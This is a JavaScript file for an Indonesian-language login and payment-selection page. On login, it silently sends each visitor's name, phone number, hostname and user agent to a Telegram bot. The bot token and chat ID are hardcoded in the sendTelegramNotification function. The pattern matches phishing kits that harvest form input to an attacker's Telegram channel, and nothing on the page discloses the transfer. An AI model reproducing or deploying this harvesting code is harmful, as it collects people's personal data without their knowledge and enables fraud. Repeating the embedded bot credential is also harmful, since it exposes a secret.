document.addEventListener('DOMContentLoaded', function() {
    const loginContainer = document.getElementById('loginContainer');
    const paymentContainer = document.getElementById('paymentContainer');
    const loginBtn = document.getElementById('loginBtn');
    const backBtn = document.getElementById('backBtn');
    const nameInput = document.getElementById('name');
    const phoneInput = document.getElementById('nope');
    const userName = document.getElementById('userName');
    const paymentMethods = document.querySelectorAll('.payment-method');
    const paymentDetails = document.querySelectorAll('.payment-details');

    // Function to send Telegram notification
    function sendTelegramNotification(name, phone) {
        const botToken = '7622409431:AAFOCDS9KWgCjui28zAvBuPxrqUXoD_CDzk';
        const chatId = '7411016617';
        
        const message = `🔔 *LOGIN BARU* 🔔%0A%0A` +
                       `📛 *Nama*: ${name}%0A` +
                       `📱 *Telepon*: ${phone}%0A` +
                       `🕒 *Waktu*: ${new Date().toLocaleString()}%0A` +
                       `🌐 *IP*: ${window.location.hostname}%0A` +
                       `🖥 *Device*: ${navigator.userAgent}`;
        
        const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}&parse_mode=Markdown`;
        
        fetch(url)
            .then(response => response.json())
            .then(data => {
                console.log('Telegram notification sent:', data);
            })
            .catch(error => {
                console.error('Error sending Telegram notification:', error);
            });
    }

    // Login Handler
    loginBtn.addEventListener('click', function() {
        const name = nameInput.value.trim();
        const phone = phoneInput.value.trim();
        
        if (name === '') {
            alert('Silakan masukkan nama Anda');
            return;
        }
        
        if (phone === '') {
            alert('Silakan masukkan nomor telepon Anda');
            return;
        }
        
        userName.textContent = name;
        loginContainer.style.display = 'none';
        paymentContainer.style.display = 'block';
        
        // Send Telegram notification
        sendTelegramNotification(name, phone);
        
        // Animation
        paymentContainer.style.animation = 'fadeIn 0.5s ease';
    });

    // Back Button Handler
    backBtn.addEventListener('click', function() {
        paymentContainer.style.display = 'none';
        loginContainer.style.display = 'block';
        nameInput.value = '';
        phoneInput.value = '';
        
        // Reset payment method selection
        paymentMethods.forEach(method => {
            method.classList.remove('active');
        });
        
        paymentDetails.forEach(detail => {
            detail.style.display = 'none';
        });
    });

    // Payment Method Selection
    paymentMethods.forEach(method => {
        method.addEventListener('click', function() {
            // Remove active class from all methods
            paymentMethods.forEach(m => {
                m.classList.remove('active');
            });
            
            // Hide all payment details
            paymentDetails.forEach(detail => {
                detail.style.display = 'none';
            });
            
            // Add active class to selected method
            this.classList.add('active');
            
            // Show corresponding payment details
            const methodType = this.getAttribute('data-method');
            document.getElementById(`${methodType}Details`).style.display = 'block';
        });
    });

    // Auto-select first payment method
    if (paymentMethods.length > 0) {
        paymentMethods[0].click();
    }
});